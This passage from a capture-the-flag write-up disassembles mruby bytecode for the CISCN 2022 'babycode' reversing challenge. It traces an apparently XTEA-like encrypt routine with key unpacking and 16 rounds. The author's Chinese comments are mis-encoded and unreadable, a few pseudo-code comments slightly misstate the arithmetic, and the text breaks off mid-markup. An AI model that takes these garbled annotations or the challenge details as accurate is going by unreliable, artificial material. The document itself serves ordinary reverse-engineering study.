class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br></pre></td><td class="code"><pre><span class="line">giantbranch@ubuntu:~/ciscn2022/mruby/mruby/bin$ ./mruby -v -b babycode.mrb </span><br><span class="line">mruby <span class="number">3.1</span><span class="number">.0</span> (<span class="number">2022</span><span class="number">-05</span><span class="number">-12</span>)</span><br><span class="line">irep <span class="number">0x18b1a90</span> nregs=<span class="number">5</span> nlocals=<span class="number">2</span> pools=<span class="number">1</span> syms=<span class="number">5</span> reps=<span class="number">2</span> ilen=<span class="number">55</span></span><br><span class="line">local variable names:</span><br><span class="line">  R1:p</span><br><span class="line">      <span class="number">000</span> LOADNILR2</span><br><span class="line">      <span class="number">002</span> LOADNILR3</span><br><span class="line">      <span class="number">004</span> CLASSR2:Crypt<span class="comment">// å®šä¹‰Cryptç±»</span></span><br><span class="line">      <span class="number">007</span> EXECR2I(<span class="number">0</span>:<span class="number">0x18b3a80</span>)<span class="comment">// æ‰§è¡Œ0x18b3a80åˆå§‹åŒ–</span></span><br><span class="line">      <span class="number">010</span> TCLASSR2</span><br><span class="line">      <span class="number">012</span> METHODR3I(<span class="number">1</span>:<span class="number">0x18b4320</span>)</span><br><span class="line">      <span class="number">015</span> DEFR2:check<span class="comment">// å¹¶æ·»ä¸Šcheckå‡½æ•°</span></span><br><span class="line">      <span class="number">018</span> SSENDR2:getsn=<span class="number">0</span><span class="comment">// getsè¾“å…¥</span></span><br><span class="line">      <span class="number">022</span> SENDR2:chompn=<span class="number">0</span></span><br><span class="line">      <span class="number">026</span> MOVER1R2; R1:p</span><br><span class="line">      <span class="number">029</span> MOVER3R1; R1:p</span><br><span class="line">      <span class="number">032</span> SSENDR2:checkn=<span class="number">1</span><span class="comment">// check(R2)æ£€æµ‹è¾“å…¥</span></span><br><span class="line">      <span class="number">036</span> JMPNOTR2<span class="number">050</span></span><br><span class="line">      <span class="number">040</span> STRINGR3L(<span class="number">0</span>); yes</span><br><span class="line">      <span class="number">043</span> SSENDR2:<span class="built_in">puts</span>n=<span class="number">1</span></span><br><span class="line">      <span class="number">047</span> JMP<span class="number">052</span></span><br><span class="line">      <span class="number">050</span> LOADNILR2</span><br><span class="line">      <span class="number">052</span> RETURNR2</span><br><span class="line">      <span class="number">054</span> STOP</span><br><span class="line"></span><br><span class="line">irep <span class="number">0x18b3a80</span> nregs=<span class="number">3</span> nlocals=<span class="number">1</span> pools=<span class="number">0</span> syms=<span class="number">1</span> reps=<span class="number">1</span> ilen=<span class="number">12</span></span><br><span class="line">      <span class="number">000</span> LOADNILR1</span><br><span class="line">      <span class="number">002</span> LOADNILR2</span><br><span class="line">      <span class="number">004</span> CLASSR1:CIPHER</span><br><span class="line">      <span class="number">007</span> EXECR1I(<span class="number">0</span>:<span class="number">0x18b3b50</span>)<span class="comment">// æ‰§è¡Œäº†0x18b3b50</span></span><br><span class="line">      <span class="number">010</span> RETURNR1</span><br><span class="line"></span><br><span class="line">irep <span class="number">0x18b3b50</span> nregs=<span class="number">3</span> nlocals=<span class="number">1</span> pools=<span class="number">0</span> syms=<span class="number">6</span> reps=<span class="number">4</span> ilen=<span class="number">55</span></span><br><span class="line">      <span class="number">000</span> LOADI32R1<span class="number">305419896</span></span><br><span class="line">      <span class="number">006</span> SETCONSTXXR1<span class="comment">// å®šä¹‰å¸¸é‡ XX=305419896</span></span><br><span class="line">      <span class="number">009</span> LOADIR1<span class="number">16</span></span><br><span class="line">      <span class="number">012</span> SETCONSTYYR1<span class="comment">// å®šä¹‰å¸¸é‡ YY=16</span></span><br><span class="line">      <span class="number">015</span> LOADSELFR1</span><br><span class="line">      <span class="number">017</span> SCLASSR1</span><br><span class="line">      <span class="number">019</span> METHODR2I(<span class="number">0</span>:<span class="number">0x18b3c60</span>)<span class="comment">// åœ¨0x18b3c60å¤„å®šä¹‰äº†encryptå‡½æ•° </span></span><br><span class="line">      <span class="number">022</span> DEFR1:encrypt</span><br><span class="line">      <span class="number">025</span> TCLASSR1</span><br><span class="line">      <span class="number">027</span> METHODR2I(<span class="number">1</span>:<span class="number">0x18b3d00</span>)<span class="comment">// åœ¨0x18b3d00å¤„ä¹Ÿå®šä¹‰äº†encryptå‡½æ•°,ä¼°è®¡é‡è½½</span></span><br><span class="line">      <span class="number">030</span> DEFR1:encrypt</span><br><span class="line">      <span class="number">033</span> SSENDR1:privaten=<span class="number">0</span></span><br><span class="line">      <span class="number">037</span> TCLASSR1</span><br><span class="line">      <span class="number">039</span> METHODR2I(<span class="number">2</span>:<span class="number">0x18b4020</span>)</span><br><span class="line">      <span class="number">042</span> DEFR1:to_key<span class="comment">// åœ¨0x18b4020å¤„å®šä¹‰äº†to_keyå‡½æ•°</span></span><br><span class="line">      <span class="number">045</span> TCLASSR1</span><br><span class="line">      <span class="number">047</span> METHODR2I(<span class="number">3</span>:<span class="number">0x18b40f0</span>)</span><br><span class="line">      <span class="number">050</span> DEFR1:enc_one<span class="comment">// åœ¨0x18b40f0å¤„å®šä¹‰äº†enc_oneå‡½æ•°</span></span><br><span class="line">      <span class="number">053</span> RETURNR1</span><br><span class="line"></span><br><span class="line">irep <span class="number">0x18b3c60</span> nregs=<span class="number">9</span> nlocals=<span class="number">5</span> pools=<span class="number">0</span> syms=<span class="number">3</span> reps=<span class="number">0</span> ilen=<span class="number">29</span></span><br><span class="line">local variable names:</span><br><span class="line">  R1:t</span><br><span class="line">  R2:p</span><br><span class="line">  R3:&amp;</span><br><span class="line">  R4:cip</span><br><span class="line">      <span class="number">000</span> ENTER<span class="number">2</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span> (<span class="number">0x80000</span>)</span><br><span class="line">      <span class="number">004</span> GETCONSTR5CIPHER</span><br><span class="line">      <span class="number">007</span> SENDR5:newn=<span class="number">0</span></span><br><span class="line">      <span class="number">011</span> MOVER4R5; R4:cip</span><br><span class="line">      <span class="number">014</span> MOVER5R4; R4:cip</span><br><span class="line">      <span class="number">017</span> MOVER6R1; R1:t</span><br><span class="line">      <span class="number">020</span> MOVER7R2; R2:p</span><br><span class="line">          <span class="comment">//ä¼ å‚ä¸ºt,p,ä¸ºå¦ä¸€ä¸ªencryptåšå‡†å¤‡</span></span><br><span class="line">      <span class="number">023</span> SENDR5:encryptn=<span class="number">2</span></span><br><span class="line">      <span class="number">027</span> RETURNR5</span><br><span class="line"></span><br><span class="line">irep <span class="number">0x18b3d00</span> nregs=<span class="number">16</span> nlocals=<span class="number">11</span> pools=<span class="number">1</span> syms=<span class="number">8</span> reps=<span class="number">1</span> ilen=<span class="number">346</span></span><br><span class="line">local variable names:</span><br><span class="line">  R1:t</span><br><span class="line">  R2:p</span><br><span class="line">  R3:&amp;</span><br><span class="line">  R4:key</span><br><span class="line">  R5:c</span><br><span class="line">  R6:n</span><br><span class="line">  R7:num1</span><br><span class="line">  R8:num2</span><br><span class="line">  R9:enum1</span><br><span class="line">  R10:enum2</span><br><span class="line">      <span class="number">000</span> ENTER<span class="number">2</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span> (<span class="number">0x80000</span>)</span><br><span class="line">      <span class="number">004</span> MOVER12R2; R2:p</span><br><span class="line">      <span class="number">007</span> SSENDR11:to_keyn=<span class="number">1</span></span><br><span class="line">      <span class="number">011</span> MOVER4R11; R4:key</span><br><span class="line">          <span class="comment">//key=to_key(p)</span></span><br><span class="line">      <span class="number">014</span> ARRAYR5R5<span class="number">0</span>; R5:c</span><br><span class="line">      <span class="number">017</span> LOADI_0R6; R6:n</span><br><span class="line">          <span class="comment">//å®šä¹‰c=[]ï¼Œn=0</span></span><br><span class="line">      <span class="number">019</span> MOVER11R6; R6:n</span><br><span class="line">      <span class="number">022</span> MOVER12R1; R1:t</span><br><span class="line">      <span class="number">025</span> SENDR12:lengthn=<span class="number">0</span></span><br><span class="line">      <span class="number">029</span> LTR11R12</span><br><span class="line">      <span class="number">031</span> JMPNOTR11<span class="number">327</span></span><br><span class="line">          <span class="comment">//æ¥ç€æ˜¯ä¸€ä¸ªå¾ªç¯</span></span><br><span class="line">      <span class="number">035</span> MOVER11R1; R1:t</span><br><span class="line">      <span class="number">038</span> MOVER12R6; R6:n</span><br><span class="line">      <span class="number">041</span> GETIDXR11R12</span><br><span class="line">      <span class="number">043</span> SENDR11:ordn=<span class="number">0</span></span><br><span class="line">      <span class="number">047</span> SENDR11:to_in=<span class="number">0</span></span><br><span class="line">      <span class="number">051</span> LOADIR12<span class="number">24</span> </span><br><span class="line">      <span class="number">054</span> SENDR11:&lt;&lt;n=<span class="number">1</span></span><br><span class="line">      <span class="number">058</span> MOVER7R11; R7:num1</span><br><span class="line">          <span class="comment">//num1=ord(t[n])&lt;&lt;24</span></span><br><span class="line">      <span class="number">061</span> MOVER11R7; R7:num1</span><br><span class="line">      <span class="number">064</span> MOVER12R1; R1:t</span><br><span class="line">      <span class="number">067</span> MOVER13R6; R6:n</span><br><span class="line">      <span class="number">070</span> ADDIR13<span class="number">1</span></span><br><span class="line">      <span class="number">073</span> GETIDXR12R13</span><br><span class="line">      <span class="number">075</span> SENDR12:ordn=<span class="number">0</span></span><br><span class="line">      <span class="number">079</span> SENDR12:to_in=<span class="number">0</span></span><br><span class="line">      <span class="number">083</span> LOADIR13<span class="number">16</span></span><br><span class="line">      <span class="number">086</span> SENDR12:&lt;&lt;n=<span class="number">1</span></span><br><span class="line">      <span class="number">090</span> ADDR11R12</span><br><span class="line">          <span class="comment">////num1=ord(t[n+1])&lt;&lt;16</span></span><br><span class="line">      <span class="number">092</span> MOVER7R11; R7:num1</span><br><span class="line">      <span class="number">095</span> MOVER11R7; R7:num1</span><br><span class="line">      <span class="number">098</span> MOVER12R1; R1:t</span><br><span class="line">      <span class="number">101</span> MOVER13R6; R6:n</span><br><span class="line">      <span class="number">104</span> ADDIR13<span class="number">2</span></span><br><span class="line">      <span class="number">107</span> GETIDXR12R13</span><br><span class="line">      <span class="number">109</span> SENDR12:ordn=<span class="number">0</span></span><br><span class="line">      <span class="number">113</span> SENDR12:to_in=<span class="number">0</span></span><br><span class="line">      <span class="number">117</span> LOADIR13<span class="number">8</span></span><br><span class="line">      <span class="number">120</span> SENDR12:&lt;&lt;n=<span class="number">1</span></span><br><span class="line">      <span class="number">124</span> ADDR11R12</span><br><span class="line">          <span class="comment">////num1=ord(t[n+2])&lt;&lt;8</span></span><br><span class="line">      <span class="number">126</span> MOVER7R11; R7:num1</span><br><span class="line">      <span class="number">129</span> MOVER11R7; R7:num1</span><br><span class="line">      <span class="number">132</span> MOVER12R1; R1:t</span><br><span class="line">      <span class="number">135</span> MOVER13R6; R6:n</span><br><span class="line">      <span class="number">138</span> ADDIR13<span class="number">3</span></span><br><span class="line">      <span class="number">141</span> GETIDXR12R13</span><br><span class="line">      <span class="number">143</span> SENDR12:ordn=<span class="number">0</span></span><br><span class="line">      <span class="number">147</span> SENDR12:to_in=<span class="number">0</span></span><br><span class="line">      <span class="number">151</span> ADDR11R12</span><br><span class="line">          <span class="comment">////num1=ord(t[n+3])</span></span><br><span class="line">      <span class="number">153</span> MOVER7R11; R7:num1</span><br><span class="line">      <span class="number">156</span> MOVER11R1; R1:t</span><br><span class="line">      <span class="number">159</span> MOVER12R6; R6:n</span><br><span class="line">      <span class="number">162</span> ADDIR12<span class="number">4</span></span><br><span class="line">      <span class="number">165</span> GETIDXR11R12</span><br><span class="line">      <span class="number">167</span> SENDR11:ordn=<span class="number">0</span></span><br><span class="line">      <span class="number">171</span> SENDR11:to_in=<span class="number">0</span></span><br><span class="line">      <span class="number">175</span> LOADIR12<span class="number">24</span></span><br><span class="line">      <span class="number">178</span> SENDR11:&lt;&lt;n=<span class="number">1</span></span><br><span class="line">      <span class="number">182</span> MOVER8R11; R8:num2</span><br><span class="line">          <span class="comment">//num2=ord(t[n+4])&lt;&lt;24</span></span><br><span class="line">      <span class="number">185</span> MOVER11R8; R8:num2</span><br><span class="line">      <span class="number">188</span> MOVER12R1; R1:t</span><br><span class="line">      <span class="number">191</span> MOVER13R6; R6:n</span><br><span class="line">      <span class="number">194</span> ADDIR13<span class="number">5</span></span><br><span class="line">      <span class="number">197</span> GETIDXR12R13</span><br><span class="line">      <span class="number">199</span> SENDR12:ordn=<span class="number">0</span></span><br><span class="line">      <span class="number">203</span> SENDR12:to_in=<span class="number">0</span></span><br><span class="line">      <span class="number">207</span> LOADIR13<span class="number">16</span></span><br><span class="line">      <span class="number">210</span> SENDR12:&lt;&lt;n=<span class="number">1</span></span><br><span class="line">      <span class="number">214</span> ADDR11R12</span><br><span class="line">          <span class="comment">//num2+=ord(t[n+5])&lt;&lt;16</span></span><br><span class="line">      <span class="number">216</span> MOVER8R11; R8:num2</span><br><span class="line">      <span class="number">219</span> MOVER11R8; R8:num2</span><br><span class="line">      <span class="number">222</span> MOVER12R1; R1:t</span><br><span class="line">      <span class="number">225</span> MOVER13R6; R6:n</span><br><span class="line">      <span class="number">228</span> ADDIR13<span class="number">6</span></span><br><span class="line">      <span class="number">231</span> GETIDXR12R13</span><br><span class="line">      <span class="number">233</span> SENDR12:ordn=<span class="number">0</span></span><br><span class="line">      <span class="number">237</span> SENDR12:to_in=<span class="number">0</span></span><br><span class="line">      <span class="number">241</span> LOADIR13<span class="number">8</span></span><br><span class="line">      <span class="number">244</span> SENDR12:&lt;&lt;n=<span class="number">1</span></span><br><span class="line">      <span class="number">248</span> ADDR11R12</span><br><span class="line">          <span class="comment">//num2=ord(t[n+6])&lt;&lt;8</span></span><br><span class="line">      <span class="number">250</span> MOVER8R11; R8:num2</span><br><span class="line">      <span class="number">253</span> MOVER11R8; R8:num2</span><br><span class="line">      <span class="number">256</span> MOVER12R1; R1:t</span><br><span class="line">      <span class="number">259</span> MOVER13R6; R6:n</span><br><span class="line">      <span class="number">262</span> ADDIR13<span class="number">7</span></span><br><span class="line">      <span class="number">265</span> GETIDXR12R13</span><br><span class="line">      <span class="number">267</span> SENDR12:ordn=<span class="number">0</span></span><br><span class="line">      <span class="number">271</span> SENDR12:to_in=<span class="number">0</span></span><br><span class="line">      <span class="number">275</span> ADDR11R12</span><br><span class="line">          <span class="comment">//num2=ord(t[n+7])</span></span><br><span class="line">      <span class="number">277</span> MOVER8R11; R8:num2</span><br><span class="line">      <span class="number">280</span> MOVER12R7; R7:num1</span><br><span class="line">      <span class="number">283</span> MOVER13R8; R8:num2</span><br><span class="line">      <span class="number">286</span> MOVER14R4; R4:key</span><br><span class="line">      <span class="number">289</span> SSENDR11:enc_onen=<span class="number">3</span></span><br><span class="line">      <span class="number">293</span> AREFR9R11<span class="number">0</span>; R9:enum1</span><br><span class="line">      <span class="number">297</span> AREFR10R11<span class="number">1</span>; R10:enum2</span><br><span class="line">          <span class="comment">//enum1,enum2=enc_one(num1,num2,key)</span></span><br><span class="line">      <span class="number">301</span> MOVER11R5; R5:c</span><br><span class="line">      <span class="number">304</span> MOVER12R9; R9:enum1</span><br><span class="line">      <span class="number">307</span> SENDR11:&lt;&lt;n=<span class="number">1</span></span><br><span class="line">          <span class="comment">//c.append(enum1)</span></span><br><span class="line">      <span class="number">311</span> MOVER11R5; R5:c</span><br><span class="line">      <span class="number">314</span> MOVER12R10; R10:enum2</span><br><span class="line">      <span class="number">317</span> SENDR11:&lt;&lt;n=<span class="number">1</span></span><br><span class="line">          <span class="comment">//c.append(enum2)</span></span><br><span class="line">      <span class="number">321</span> ADDIR6<span class="number">8</span>; R6:n</span><br><span class="line">      <span class="number">324</span> JMP<span class="number">019</span></span><br><span class="line">          <span class="comment">//æ­¥é•¿ä¸º8çš„å¾ªç¯</span></span><br><span class="line">      <span class="number">327</span> MOVER11R5; R5:c</span><br><span class="line">      <span class="number">330</span> BLOCKR12<span class="title function_">I</span><span class="params">(<span class="number">0</span>:<span class="number">0x18b3f50</span>)</span></span><br><span class="line">      333 SENDBR11:collectn=<span class="number">0</span></span><br><span class="line">      <span class="number">337</span> STRINGR12<span class="title function_">L</span><span class="params">(<span class="number">0</span>)</span>; </span><br><span class="line">      <span class="number">340</span> SENDR11:joinn=<span class="number">1</span></span><br><span class="line">          <span class="comment">//è°ƒç”¨&quot;&quot;.join(c.collect(0x18b3f50))</span></span><br><span class="line">      <span class="number">344</span> RETURNR11</span><br><span class="line"></span><br><span class="line">irep <span class="number">0x18b3f50</span> nregs=<span class="number">7</span> nlocals=<span class="number">3</span> pools=<span class="number">1</span> syms=<span class="number">1</span> reps=<span class="number">0</span> ilen=<span class="number">16</span></span><br><span class="line">local variable names:</span><br><span class="line">  R1:x</span><br><span class="line">  R2:&amp;</span><br><span class="line">      <span class="number">000</span> ENTER<span class="number">1</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span> (<span class="number">0x40000</span>)</span><br><span class="line">      <span class="number">004</span> STRINGR4L(<span class="number">0</span>); %<span class="number">.8</span>x</span><br><span class="line">      <span class="number">007</span> MOVER5R1; R1:x</span><br><span class="line">      <span class="number">010</span> SSENDR3:<span class="built_in">sprintf</span>n=<span class="number">2</span></span><br><span class="line">          <span class="comment">//è¿›åˆ¶è½¬æ¢</span></span><br><span class="line">      <span class="number">014</span> RETURNR3</span><br><span class="line"></span><br><span class="line">irep <span class="number">0x18b4020</span> nregs=<span class="number">6</span> nlocals=<span class="number">3</span> pools=<span class="number">1</span> syms=<span class="number">1</span> reps=<span class="number">0</span> ilen=<span class="number">16</span></span><br><span class="line">local variable names:</span><br><span class="line">  R1:p</span><br><span class="line">  R2:&amp;</span><br><span class="line">      <span class="number">000</span> ENTER<span class="number">1</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span> (<span class="number">0x40000</span>)</span><br><span class="line">      <span class="number">004</span> MOVER3R1; R1:p</span><br><span class="line">      <span class="number">007</span> STRINGR4<span class="title function_">L</span><span class="params">(<span class="number">0</span>)</span>; L*</span><br><span class="line">      <span class="number">010</span> SENDR3:unpackn=<span class="number">1</span></span><br><span class="line">          <span class="comment">//æ¯å››ä¸ªå­—èŠ‚è½¬æˆä¸€ä¸ªæ•´æ•°</span></span><br><span class="line">      <span class="number">014</span> RETURNR3</span><br><span class="line"></span><br><span class="line">irep <span class="number">0x18b40f0</span> nregs=<span class="number">11</span> nlocals=<span class="number">8</span> pools=<span class="number">0</span> syms=<span class="number">2</span> reps=<span class="number">1</span> ilen=<span class="number">42</span></span><br><span class="line">local variable names:</span><br><span class="line">  R1:num1</span><br><span class="line">  R2:num2</span><br><span class="line">  R3:key</span><br><span class="line">  R4:&amp;</span><br><span class="line">  R5:y</span><br><span class="line">  R6:z</span><br><span class="line">  R7:s</span><br><span class="line">      <span class="number">000</span> ENTER<span class="number">3</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span> (<span class="number">0xc0000</span>)</span><br><span class="line">      <span class="number">004</span> MOVER8R1; R1:num1</span><br><span class="line">      <span class="number">007</span> MOVER9R2; R2:num2</span><br><span class="line">      <span class="number">010</span> LOADI_0R10</span><br><span class="line">      <span class="number">012</span> MOVER5R8; R5:y</span><br><span class="line">      <span class="number">015</span> MOVER6R9; R6:z</span><br><span class="line">      <span class="number">018</span> MOVER7R10; R7:s</span><br><span class="line">      <span class="number">021</span> GETCONSTR8YY</span><br><span class="line">      <span class="number">024</span> BLOCKR9<span class="title function_">I</span><span class="params">(<span class="number">0</span>:<span class="number">0x18b41c0</span>)</span></span><br><span class="line">      027 SENDBR8:timesn=<span class="number">0</span></span><br><span class="line">          <span class="comment">//å¾ªç¯YYæ¬¡</span></span><br><span class="line">      <span class="number">031</span> MOVER8R5; R5:y</span><br><span class="line">      <span class="number">034</span> MOVER9R6; R6:z</span><br><span class="line">          <span class="comment">//è¿”å›y,z</span></span><br><span class="line">      <span class="number">037</span> ARRAYR8R8<span class="number">2</span></span><br><span class="line">      <span class="number">040</span> RETURNR8</span><br><span class="line"></span><br><span class="line">irep <span class="number">0x18b41c0</span> nregs=<span class="number">10</span> nlocals=<span class="number">3</span> pools=<span class="number">1</span> syms=<span class="number">5</span> reps=<span class="number">0</span> ilen=<span class="number">186</span></span><br><span class="line">local variable names:</span><br><span class="line">  R1:i</span><br><span class="line">  R2:&amp;</span><br><span class="line">      <span class="comment">//ä¸å¤ªé‡è¦çš„ä½æ“ä½œ</span></span><br><span class="line">      <span class="number">000</span> ENTER<span class="number">1</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span> (<span class="number">0x40000</span>)</span><br><span class="line">      <span class="number">004</span> GETUPVARR3<span class="number">5</span><span class="number">0</span></span><br><span class="line">      <span class="number">008</span> GETUPVARR4<span class="number">6</span><span class="number">0</span></span><br><span class="line">      <span class="number">012</span> LOADI_3R5</span><br><span class="line">      <span class="number">014</span> SENDR4:&lt;&lt;n=<span class="number">1</span></span><br><span class="line">      <span class="number">018</span> GETUPVARR5<span class="number">6</span><span class="number">0</span></span><br><span class="line">      <span class="number">022</span> LOADI_5R6</span><br><span class="line">      <span class="number">024</span> SENDR5:&gt;&gt;n=<span class="number">1</span></span><br><span class="line">      <span class="number">028</span> SENDR4:^n=<span class="number">1</span></span><br><span class="line">      <span class="number">032</span> GETUPVARR5<span class="number">6</span><span class="number">0</span></span><br><span class="line">      <span class="number">036</span> ADDR4R5</span><br><span class="line">      <span class="number">038</span> GETUPVARR5<span class="number">7</span><span class="number">0</span></span><br><span class="line">      <span class="number">042</span> GETUPVARR6<span class="number">3</span><span class="number">0</span></span><br><span class="line">      <span class="number">046</span> GETUPVARR7<span class="number">7</span><span class="number">0</span></span><br><span class="line">      <span class="number">050</span> LOADIR8<span class="number">11</span></span><br><span class="line">      <span class="number">053</span> SENDR7:&gt;&gt;n=<span class="number">1</span></span><br><span class="line">      <span class="number">057</span> ADDIR7<span class="number">1</span></span><br><span class="line">      <span class="number">060</span> LOADI_3R8</span><br><span class="line">      <span class="number">062</span> SENDR7:&amp;n=<span class="number">1</span></span><br><span class="line">      <span class="number">066</span> GETIDXR6R7</span><br><span class="line">      <span class="number">068</span> ADDR5R6</span><br><span class="line">      <span class="number">070</span> SENDR4:^n=<span class="number">1</span></span><br><span class="line">      <span class="number">074</span> ADDR3R4</span><br><span class="line">      <span class="number">076</span> SETUPVARR3<span class="number">5</span><span class="number">0</span></span><br><span class="line">      <span class="number">080</span> LOADLR4L(<span class="number">0</span>); <span class="number">4294967295</span></span><br><span class="line">      <span class="number">083</span> SENDR3:&amp;n=<span class="number">1</span></span><br><span class="line">      <span class="number">087</span> SETUPVARR3<span class="number">5</span><span class="number">0</span></span><br><span class="line">      <span class="number">091</span> GETUPVARR3<span class="number">7</span><span class="number">0</span></span><br><span class="line">      <span class="number">095</span> GETCONSTR4XX</span><br><span class="line">      <span class="number">098</span> ADDR3R4</span><br><span class="line">      <span class="number">100</span> SETUPVARR3<span class="number">7</span><span class="number">0</span></span><br><span class="line">      <span class="number">104</span> GETUPVARR3<span class="number">6</span><span class="number">0</span></span><br><span class="line">      <span class="number">108</span> GETUPVARR4<span class="number">5</span><span class="number">0</span></span><br><span class="line">      <span class="number">112</span> LOADI_3R5</span><br><span class="line">      <span class="number">114</span> SENDR4:&lt;&lt;n=<span class="number">1</span></span><br><span class="line">      <span class="number">118</span> GETUPVARR5<span class="number">5</span><span class="number">0</span></span><br><span class="line">      <span class="number">122</span> LOADI_5R6</span><br><span class="line">      <span class="number">124</span> SENDR5:&gt;&gt;n=<span class="number">1</span></span><br><span class="line">      <span class="number">128</span> SENDR4:^n=<span class="number">1</span></span><br><span class="line">      <span class="number">132</span> GETUPVARR5<span class="number">5</span><span class="number">0</span></span><br><span class="line">      <span class="number">136</span> ADDR4R5</span><br><span class="line">      <span class="number">138</span> GETUPVARR5<span class="number">7</span><span class="number">0</span></span><br><span class="line">      <span class="number">142</span> GETUPVARR6<span class="number">3</span><span class="number">0</span></span><br><span class="line">      <span class="number">146</span> GETUPVARR7<span class="number">7</span><span class="number">0</span></span><br><span class="line">      <span class="number">150</span> ADDIR7<span class="number">1</span></span><br><span class="line">      <span class="number">153</span> LOADI_3R8</span><br><span class="line">      <span class="number">155</span> SENDR7:&amp;n=<span class="number">1</span></span><br><span class="line">      <span class="number">159</span> GETIDXR6R7</span><br><span class="line">      <span class="number">161</span> ADDR5R6</span><br><span class="line">      <span class="number">163</span> SENDR4:^n=<span class="number">1</span></span><br><span class="line">      <span class="number">167</span> ADDR3R4</span><br><span class="line">      <span class="number">169</span> SETUPVARR3<span class="number">6</span><span class="number">0</span></span><br><span class="line">      <span class="number">173</span> LOADLR4L(<span class="number">0</span>); <span class="number">4294967295</span></span><br><span class="line">      <span class="number">176</span> SENDR3:&amp;n=<span class="number">1</span></span><br><span class="line">      <span class="number">180</span> SETUPVARR3<span class="number">6</span><span class="number">0</span></span><br><span class="line">      <span class="number">184</span> RETURNR3</span><br><span class="line"></span><br><span class="line">irep <span class="number">0x18b4320</span> nregs=<span class="number">13</span> nlocals=<span class="number">8</span> pools=<span 